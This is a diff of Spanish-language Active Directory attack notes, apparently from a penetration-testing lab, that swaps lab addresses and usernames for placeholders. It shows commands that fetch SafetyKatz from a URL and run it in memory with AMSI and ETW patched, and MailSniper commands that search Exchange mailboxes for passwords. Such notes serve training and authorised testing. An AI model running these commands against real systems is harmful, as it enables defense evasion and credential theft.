@@ -44,11 +44,11 @@ Podemos usar NetLoader ([https://github.com/Flangvik/NetLoader](https://github.c
 
 Se puede usar para cargar archivos binarios desde la ruta de archivo o URL y parchear AMSI y ETW mientras se ejecuta.
 
-`C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
+`C:\Users\Public\Loader.exe -path http://IP/SafetyKatz.exe`
 
 También tenemos AssemblyLoad.exe que se puede usar para cargar el Netloader en la memoria desde una URL que luego carga un binario
 
-`C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
+`C:\Users\Public\AssemblyLoad.exe http://IP/Loader.exe -path http://IP/SafetyKatz.exe`
 
 **Abusing Trusts for Microsoft Products**
 
@@ -71,7 +71,7 @@ conviértase en parte de la confianza del dominio.
 
     - Usaremos MailSniper ([https://github.com/dafthack/MailSniper](https://github.com/dafthack/MailSniper)) para
     enumerar y acceder a los buzones de correo.
-    - Podemos enumerar todos los correos con el comando: `Get-GlobalAddressList -ExchHostname us-exchange -Verbose -UserName us\studentuser1 -Password <password>`
+    - Podemos enumerar todos los correos con el comando: `Get-GlobalAddressList -ExchHostname us-exchange -Verbose -UserName us\USER -Password <password>`
     - A continuación, echemos un vistazo a los buzones de correo donde nuestro usuario actual tiene acceso: `Invoke-OpenInboxFinder -EmailList C:\AD\Tools\emails.txt
     -ExchHostname us-exchange -Verbose`
-    - Una vez hayamos identificado los correos, este comando busca entre los 100 mejores palabras clave como pass, creds : `Invoke-SelfSearch -Mailbox pawadmin@techcorp.local -ExchHostname us-exchange -OutputCsv .\mail.csv`
+    - Una vez hayamos identificado los correos, este comando busca entre los 100 mejores palabras clave como pass, creds : `Invoke-SelfSearch -Mailbox EMAIL -ExchHostname us-exchange -OutputCsv .\mail.csv`
